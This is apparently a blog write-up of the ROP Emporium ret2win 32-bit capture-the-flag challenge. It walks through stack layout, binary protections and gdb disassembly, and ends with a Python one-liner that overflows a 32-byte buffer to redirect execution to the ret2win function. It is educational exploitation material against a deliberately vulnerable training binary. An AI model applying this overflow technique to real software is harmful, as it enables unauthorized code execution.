---
title: Rop Emporium ret2win 32 bits
author: pwndumb
date: 2018-12-09 14:10:00 +0800
categories: [Ropemporium]
tags: [ropemporium]
---

[Rop Emporium retwin Challenge](https://ropemporium.com/challenge/ret2win.html)

This little post intend explain how I solved the first chall of Rop [**Rop Emporium**](https://ropemporium.com/challenge/ret2win.html) named __ret2win__. The chall has two versions : 32 and 64 bits. In this post I will explain 32 bits version.



# [](#header-1)Function Call and Stack Memory Layout

<div align="justify" markdown="1">
First, lets uderstanding a little bit of memory layout and see how the ***stack*** works .

How the  ***stack*** grow depends on the [ABI - Application binary interface](https://en.wikipedia.org/wiki/Application_binary_interface). For now, I will assume the ***stack***  grow downforward, wich is corretc in most of the opearations systems architetures like IA32.  
The ***stack*** is a LIFO (Last In, First Out) data structure used to exchange data between memory and **cpu registers**. Generally speaking, the ***stack*** is used to statical data and **heap** for dynamic data, usually with the C function called  **malloc**. 

Indeed, the ***stack*** save the context of the function. In it are keept the arguments and local variables beyond the metadata to recovery the previous context, for this are used the cpu registers.

For track the ***stack*** state, the *CPU* use two register: **ESP** and **EBP**. For the **ESP** we assume the definition  writing in [**The Shellcode Handbook**](https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-Security-ebook-dp-B004P5O38Q/dp/B004P5O38Q/):

</div>

><div align="justify" markdown="1">"The boundary of the ***stack*** is defined by the ***extended stack pointer*** **(ESP)** register, which points to **the top of the stack**. Stack-specific instructions, PUSH and POP, use ESP to know here the stack is in memory. In most architectures, especially IA32, on which this chapter is focused, ESP points to the last address used by the stack. In other implementations, it points to the first free address."</div>

Data is place onto the stack using the **PUSH** instruction and removed from it with the **POP** instruction. 

The **EBP** points to the base of the current stack frame.  When a function is call in assembly language, the both register are used in [**the prologue**](https://en.wikipedia.org/wiki/Function_prologue) of the function. The prologue is used to save the previous state of memory layout.



```nasm
// Prologue of the function 
0x080485f6 <+0>:     push   ebp
0x080485f7 <+1>:     mov    ebp,esp
0x080485f9 <+3>:     sub    esp,0x28
```


``` nasm

                |++++++++++++++++++++++++++| 0x0000
                |                          |  
    ESP  ->     |++++++++++++++++++++++++++|
                |                          |
                |   Saved Previuos Stack   |
                |     Frame Pointer        |
                |++++++++++++++++++++++++++|
                |          RET             |
                |                          |
    EBP  ->     |++++++++++++++++++++++++++|
                |         Functions        |
                |        Parameters        |
                |++++++++++++++++++++++++++| 0xFFFF

```
Function  Return Address

# [](#header-1)The Challenge

### 32 bits
<div align="justify" markdown="1">
The challenge consist of the small program maybe write in C language. The goal is make a call to the function ret2win wich is never called in normal execution flow. Lets see the binary properties. Using the checksec command([pwntools framework](https://github.com/Gallopsled/pwntools)), we see useful informations: 


```bash
┌[dumb☮dumbland]-(~/ropemporium/ret2win32)-[git://master ✗]-
└> checksec ret2win32
[*] '/home/user/ropemporium/ret2win32/ret2win32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```


 Lets dissect this informations:

- Arch: i386-32-little: The binary is 32 bits.
- RELRO: Partial RELRO. Realocations Read only. What it is ? In a dumb way  explanation, this a security mecanism wich makes some sections of binary read-only. There are two RELRO modes: PARTIAL and FULL.
- Stack: No canary found. The Canary is other protection mechanism used to make the binary exploitation harder.
- NX:  NX enabled. This means we can't execute code in the stack.
- PIE: No PIE. PIE is a feature to suport ASLR in executble files. In a dumb way explanation, ASLR is a protection feature. Every time the binary is loaded, the base address is randomly change.

</div>

>Reference links: [RELRO](https://ctf101.org/binary-exploitation/relocation-read-only/?)
[NX](https://en.wikipedia.org/wiki/NX_bit)
[PIE](https://stackoverflow.com/questions/2463150/what-is-the-fpie-option-for-position-independent-executables-in-gcc-and-ld)   


<br>
So running the binary we see the following strings:

```bash
┌[dumb☮dumbland]-(~/ropemporium/ret2win32)-[git://master ✗]-
└> ./ret2win32
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And dont worry about null bytes, we re using fgets!

> AAAAAAAAAAAAA

Exiting

```
After initial foothold we put the binary in *gdb*. I use the [*pwndbg*](https://github.com/pwndbg/pwndbg) to put some custom functions in *gdb*.  
<br>


```nasm
gdb -q ret2win32
pwndbg> i functions
All defined functions:

Non-debugging symbols:
0x080483c0  _init
0x08048400  printf@plt
0x08048410  fgets@plt
0x08048420  puts@plt
0x08048430  system@plt
0x08048440  __libc_start_main@plt
0x08048450  setvbuf@plt
0x08048460  memset@plt
0x08048470  __gmon_start__@plt
0x08048480  _start
0x080484b0  __x86.get_pc_thunk.bx
0x080484c0  deregister_tm_clones
0x080484f0  register_tm_clones
0x08048530  __do_global_dtors_aux
0x08048550  frame_dummy
0x0804857b  main
0x080485f6  pwnme
0x08048659  ret2win 
0x08048690  __libc_csu_init
0x080486f0  __libc_csu_fini
0x080486f4  _fini
pwndbg>
 
````
We see three important functions: 1. main 2. pwnme and 3. ret2win.   
<br>
Let's analyze the main function.
<br>

```nasm
pwndbg> disassemble main
Dump of assembler code for function main:
   0x0804857b <+0>:     lea    ecx,[esp+0x4]
   0x0804857f <+4>:     and    esp,0xfffffff0
   0x08048582 <+7>:     push   DWORD PTR [ecx-0x4]
   0x08048585 <+10>:    push   ebp
   0x08048586 <+11>:    mov    ebp,esp
   0x08048588 <+13>:    push   ecx
   0x08048589 <+14>:    sub    esp,0x4
   0x0804858c <+17>:    mov    eax,ds:0x804a064
   0x08048591 <+22>:    push   0x0
   0x08048593 <+24>:    push   0x2
   0x08048595 <+26>:    push   0x0
   0x08048597 <+28>:    push   eax
   0x08048598 <+29>:    call   0x8048450 <setvbuf@plt>
   0x0804859d <+34>:    add    esp,0x10
   0x080485a0 <+37>:    mov    eax,ds:0x804a040
   0x080485a5 <+42>:    push   0x0
   0x080485a7 <+44>:    push   0x2
   0x080485a9 <+46>:    push   0x0
   0x080485ab <+48>:    push   eax
   0x080485ac <+49>:    call   0x8048450 <setvbuf@plt>
   0x080485b1 <+54>:    add    esp,0x10
   0x080485b4 <+57>:    sub    esp,0xc
   0x080485b7 <+60>:    push   0x8048710
   0x080485bc <+65>:    call   0x8048420 <puts@plt>
   0x080485c1 <+70>:    add    esp,0x10
   0x080485c4 <+73>:    sub    esp,0xc
   0x080485c7 <+76>:    push   0x8048728
   0x080485cc <+81>:    call   0x8048420 <puts@plt>
   0x080485d1 <+86>:    add    esp,0x10
   0x080485d4 <+89>:    call   0x80485f6 <pwnme>
   0x080485d9 <+94>:    sub    esp,0xc
   0x080485dc <+97>:    push   0x8048730
   0x080485e1 <+102>:   call   0x8048420 <puts@plt>
   0x080485e6 <+107>:   add    esp,0x10
   0x080485e9 <+110>:   mov    eax,0x0
   0x080485ee <+115>:   mov    ecx,DWORD PTR [ebp-0x4]
   0x080485f1 <+118>:   leave
   0x080485f2 <+119>:   lea    esp,[ecx-0x4]
   0x080485f5 <+122>:   ret
End of assembler dump.
pwndbg>
```

Following the gdb output we disassemble the *pwn function*:

```nasm
pwndbg> disassemble pwnme
Dump of assembler code for function pwnme:
   0x080485f6 <+0>:     push   ebp
   0x080485f7 <+1>:     mov    ebp,esp
   0x080485f9 <+3>:     sub    esp,0x28
   0x080485fc <+6>:     sub    esp,0x4
   0x080485ff <+9>:     push   0x20
   0x08048601 <+11>:    push   0x0
   0x08048603 <+13>:    lea    eax,[ebp-0x28]
   0x08048606 <+16>:    push   eax
   0x08048607 <+17>:    call   0x8048460 <memset@plt>
   0x0804860c <+22>:    add    esp,0x10
   0x0804860f <+25>:    sub    esp,0xc
   0x08048612 <+28>:    push   0x804873c
   0x08048617 <+33>:    call   0x8048420 <puts@plt>
   0x0804861c <+38>:    add    esp,0x10
   0x0804861f <+41>:    sub    esp,0xc
   0x08048622 <+44>:    push   0x80487bc
   0x08048627 <+49>:    call   0x8048420 <puts@plt>
   0x0804862c <+54>:    add    esp,0x10
   0x0804862f <+57>:    sub    esp,0xc
   0x08048632 <+60>:    push   0x8048821
   0x08048637 <+65>:    call   0x8048400 <printf@plt>
   0x0804863c <+70>:    add    esp,0x10
   0x0804863f <+73>:    mov    eax,ds:0x804a060
   0x08048644 <+78>:    sub    esp,0x4
   0x08048647 <+81>:    push   eax
   0x08048648 <+82>:    push   0x32
   0x0804864a <+84>:    lea    eax,[ebp-0x28]
   0x0804864d <+87>:    push   eax
   0x0804864e <+88>:    call   0x8048410 <fgets@plt>
   0x08048653 <+93>:    add    esp,0x10
   0x08048656 <+96>:    nop
   0x08048657 <+97>:    leave
   0x08048658 <+98>:    ret
End of assembler dump.
```
<div align="justify" markdown="1">
In the ```0x08048617 <+33>:    call   0x8048420 <puts@plt> ``` the program puts in the output, the strings  we see when run the program. The same was done in ``` 0x08048627 <+49>:    call   0x8048420 <puts@plt>``` and ```0x08048637 <+65>:    call   0x8048400 <printf@plt>```. In the address **0x080485ff**  the buffer has 0x20 (32 bytes) , but in the address **0x0804864e** the fgtes is called with buffer size of 0x32 (50 bytes) - reserved in address **0x08048648**.

In the ``` 0x0804864e <+88>:    call   0x8048410 <fgets@plt>``` the program call the functin fgtes. This is when the user put the message to program handle with it.
</div>

```bash
┌[dumb☮dumbland]-(~/ropemporium/ret2win32)-[git://master ✗]-
└> ./ret2win32
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And dont worry about null bytes, were using fgets!

> AAAAAAAAAAAAAA

Exiting
```

After put the 'A's, the program exit.  Remember, our goal is execute the function ret2win wich start at the address **0x08048659**:

```nasm
pwndbg> disassemble ret2win
Dump of assembler code for function ret2win:
   0x08048659 <+0>:     push   ebp
   0x0804865a <+1>:     mov    ebp,esp
   0x0804865c <+3>:     sub    esp,0x8
   0x0804865f <+6>:     sub    esp,0xc
   0x08048662 <+9>:     push   0x8048824
   0x08048667 <+14>:    call   0x8048400 <printf@plt>
   0x0804866c <+19>:    add    esp,0x10
   0x0804866f <+22>:    sub    esp,0xc
   0x08048672 <+25>:    push   0x8048841
   0x08048677 <+30>:    call   0x8048430 <system@plt>
   0x0804867c <+35>:    add    esp,0x10
   0x0804867f <+38>:    nop
   0x08048680 <+39>:    leave
   0x08048681 <+40>:    ret
End of assembler dump.
```

Fisrt I ran the following command:

```bash

sudo dmesg -C  # this command will be clear the ring  buffer of the kernel.

```

After, I send a buffer with 50 bytes to program:

``` bash

python -c 'print "A" * 50' | ./ret2win32
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> [1]    6408 done                              python -c 'print "A" * 50' | 
       6409 segmentation fault (core dumped)  ./ret2win32

```
Running the command bellow, you clearly see the whats happened: The ***'A'*** (our input) overwrite the return address.  

```bash

┌[dumb☮dumbland]-(~/ropemporium/ret2win32)-[git://master ✗]-
└> sudo dmesg                              
[ 6120.515428] ret2win32[6499]: segfault at 41414141 ip 0000000041414141 sp 00000000ffee1a40 error 14 in libc-2.30.so[f7d90000+1d000]
[ 6120.515438] Code: Bad RIP value.
┌[dumb☮dumbland]-(~/ropemporium/ret2wi

```

After research to find the exact size of buffer tha we can control the ***return address***, we achieve our goal - execute the ***ret2win*** function:

```bash 

┌[dumb☮dumbland]-(~/ropemporium/ret2win32)-[git://master ✗]-
└> python -c 'print "A" * 44  + "\x59\x86\x04\x08"' | ./ret2win32
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
[1]    6691 done                              python -c 'print "A" * 44  + "\x59\x86\x04\x08"' | 
       6692 segmentation fault (core dumped)  ./ret2win32


```


In this particular challenge, the same metodology can be used to solve the 64 bits version. 